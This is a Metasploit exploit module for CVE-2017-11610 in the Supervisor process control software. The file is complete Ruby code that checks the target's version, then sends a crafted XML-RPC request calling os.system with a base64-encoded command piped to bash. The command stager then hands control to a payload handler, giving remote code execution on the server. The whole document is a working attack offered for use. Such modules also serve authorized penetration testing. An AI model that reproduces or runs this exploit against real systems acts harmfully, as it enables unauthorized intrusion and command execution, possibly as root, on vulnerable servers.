# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Supervisor XML-RPC Authenticated Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the Supervisor process control software, where an authenticated client
        can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server.
        The commands will be run as the same user as supervisord. Depending on how supervisord has been configured, this
        may be root. This vulnerability can only be exploited by an authenticated client, or if supervisord has been
        configured to run an HTTP server without authentication. This vulnerability affects versions 3.0a1 to 3.3.2.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Calum Hutton <c.e.hutton@gmx.com>&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://github.com/Supervisor/supervisor/issues/964&#039;],
          [&#039;URL&#039;, &#039;https://www.debian.org/security/2017/dsa-3942&#039;],
          [&#039;URL&#039;, &#039;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11610&#039;],
          [&#039;URL&#039;, &#039;https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610&#039;],
          [&#039;CVE&#039;, &#039;2017-11610&#039;]
        ],
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;3.0a1-3.3.2&#039;, {}]
        ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039;         => 9001,
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Jul 19 2017&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        Opt::RPORT(9001),
        OptString.new(&#039;HttpUsername&#039;, [false, &#039;Username for HTTP basic auth&#039;]),
        OptString.new(&#039;HttpPassword&#039;, [false, &#039;Password for HTTP basic auth&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the XML-RPC endpoint&#039;, &#039;/RPC2&#039;]),
      ]
    )
  end

  def check_version(version)
    if version <= Gem::Version.new(&#039;3.3.2&#039;) and version >= Gem::Version.new(&#039;3.0a1&#039;)
      return true
    else
      return false
    end
  end

  def check

    print_status(&#039;Extracting version from web interface..&#039;)

    params = {
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(&#039;/&#039;)
    }
    if !datastore[&#039;HttpUsername&#039;].to_s.empty? and !datastore[&#039;HttpPassword&#039;].to_s.empty?
      print_status("Using basic auth (#{datastore[&#039;HttpUsername&#039;]}:#{datastore[&#039;HttpPassword&#039;]})")
      params.merge!({&#039;authorization&#039; => basic_auth(datastore[&#039;HttpUsername&#039;], datastore[&#039;HttpPassword&#039;])})
    end
    res = send_request_cgi(params)

    if res
      if res.code == 200
        match = res.body.match(/<span>(\d+\.[\dab]\.\d+)<\/span>/)
        if match
          version = Gem::Version.new(match[1])
          if check_version(version)
            print_good("Vulnerable version found: #{version}")
            return Exploit::CheckCode::Appears
          else
            print_bad("Version #{version} is not vulnerable")
            return Exploit::CheckCode::Safe
          end
        else
          print_bad(&#039;Could not extract version number from web interface&#039;)
          return Exploit::CheckCode::Unknown
        end
      elsif res.code == 401
        print_bad("Authentication failed: #{res.code} response")
        return Exploit::CheckCode::Safe
      else
        print_bad("Unexpected HTTP code: #{res.code} response")
        return Exploit::CheckCode::Unknown
      end
    else
      print_bad(&#039;Error connecting to web interface&#039;)
      return Exploit::CheckCode::Unknown
    end

  end

  def execute_command(cmd, opts = {})

    # XML-RPC payload template, use nohup and &amp; to detach and background the process so it doesnt hangup the web server
    # Credit to the following urls for the os.system() payload
    # https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610
    # https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html
    xml_payload = %{<?xml version="1.0"?>
<methodCall>
  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
  <params>
    <param>
      <string>echo -n #{Rex::Text.encode_base64(cmd)}|base64 -d|nohup bash > /dev/null 2>&amp;amp;1 &amp;amp;</string>
    </param>
  </params>
</methodCall>}

    # Send the XML-RPC payload via POST to the specified endpoint
    endpoint_path = target_uri.path
    print_status("Sending XML-RPC payload via POST to #{peer}#{datastore[&#039;TARGETURI&#039;]}")

    params = {
      &#039;method&#039;        => &#039;POST&#039;,
      &#039;uri&#039;           => normalize_uri(endpoint_path),
      &#039;ctype&#039;         => &#039;text/xml&#039;,
      &#039;headers&#039;       => {&#039;Accept&#039; => &#039;text/xml&#039;},
      &#039;data&#039;          => xml_payload,
      &#039;encode_params&#039; => false
    }
    if !datastore[&#039;HttpUsername&#039;].to_s.empty? and !datastore[&#039;HttpPassword&#039;].to_s.empty?
      print_status("Using basic auth (#{datastore[&#039;HttpUsername&#039;]}:#{datastore[&#039;HttpPassword&#039;]})")
      params.merge!({&#039;authorization&#039; => basic_auth(datastore[&#039;HttpUsername&#039;], datastore[&#039;HttpPassword&#039;])})
    end
    return send_request_cgi(params, timeout=5)

  end

  def exploit

    res = execute_cmdstager(:linemax => 800)

    if res
      if res.code == 401
        fail_with(Failure::NoAccess, "Authentication failed: #{res.code} response")
      elsif res.code == 404
        fail_with(Failure::NotFound, "Invalid XML-RPC endpoint: #{res.code} response")
      else
        fail_with(Failure::UnexpectedReply, "Unexpected HTTP code: #{res.code} response")
      end
    else
      print_good(&#039;Request returned without status code, usually indicates success. Passing to handler..&#039;)
      handler
    end

  end

end

